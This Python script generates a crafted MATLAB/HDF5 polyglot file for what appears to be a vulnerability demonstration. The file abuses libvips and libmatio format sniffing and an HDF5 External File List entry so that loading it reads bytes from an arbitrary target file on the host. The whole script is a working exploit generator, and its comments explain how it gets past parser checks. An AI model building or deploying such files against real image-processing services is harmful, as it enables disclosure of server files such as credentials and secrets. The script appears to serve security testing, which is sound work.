"""Crafts a MATLAB 5.0/7.3 dual-identity canary file for the CIT-294 live run.

Structurally identical to what libmatio's own Mat_CreateVer(MAT_FT_MAT73)
writes (confirmed by diffing against a libmatio-written file byte for byte):
a 512-byte userblock, one root-group HDF5 dataset named "d" with a
MATLAB_class="uint8" attribute (fixed-length, NULLTERM-padded -- libmatio's
HDF5 reader silently returns class_type 0/empty for a variable-length or
NULLPAD attribute, which is what h5py's high-level API writes by default).

The dataset's storage is an HDF5 External File List entry (offset, length)
into TARGET, so the bytes libvips eventually hands back as pixel data are
read from that file at load time, not embedded in this file. Only the first
10 bytes of the 128-byte header are altered from what a genuine MAT 7.3 file
would contain: the descriptive text claims "MATLAB 5.0" (so libvips'
vips__mat_ismat() sniffer routes the file to matload) while the version
field at bytes 124-125 is left honest at 0x0200 (7.3, so libmatio's Mat_Open
still dispatches to its HDF5/7.3 reader). See ../CIT-294.md and
src/cve-2026-66066/vendor/reference/the-attack.md for why both fields are
required and why they must disagree.
"""
import argparse

import h5py
from h5py import h5a, h5s, h5t
import numpy as np

HEADER_TEXT = b"MATLAB 5.0 MAT-file, inert kr2s canary, crafted for CIT-294 live-path demo"


def craft(out_path: str, target_path: str, offset: int, length: int) -> None:
    with h5py.File(out_path, "w", userblock_size=512) as handle:
        dset = handle.create_dataset(
            "d", shape=(1, length), dtype="u1",
            external=[(target_path, offset, length)],
        )
        class_name = b"uint8"
        tid = h5t.C_S1.copy()
        tid.set_size(len(class_name))
        tid.set_strpad(h5t.STR_NULLTERM)
        tid.set_cset(h5t.CSET_ASCII)
        attr = h5a.create(dset.id, b"MATLAB_class", tid, h5s.create(h5s.SCALAR))
        # mtype=tid (not the numpy default memory type) is required: HDF5's
        # string conversion otherwise reserves the attribute's last byte for
        # a null terminator whenever source and destination padding differ,
        # silently truncating "uint8" to "uint" + "\0".
        attr.write(np.array(class_name, dtype="S%d" % len(class_name)), mtype=tid)

    with open(out_path, "r+b") as raw:
        header = HEADER_TEXT.ljust(124, b" ") + b"\x00\x02" + b"IM"
        assert len(header) == 128
        raw.write(header)


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("out_path")
    ap.add_argument("target_path", help="file the External File List entry points at")
    ap.add_argument("--offset", type=int, default=0)
    ap.add_argument("--length", type=int, required=True)
    args = ap.parse_args()
    craft(args.out_path, args.target_path, args.offset, args.length)
    print(f"wrote {args.out_path} (external -> {args.target_path}[{args.offset}:{args.offset + args.length}])")
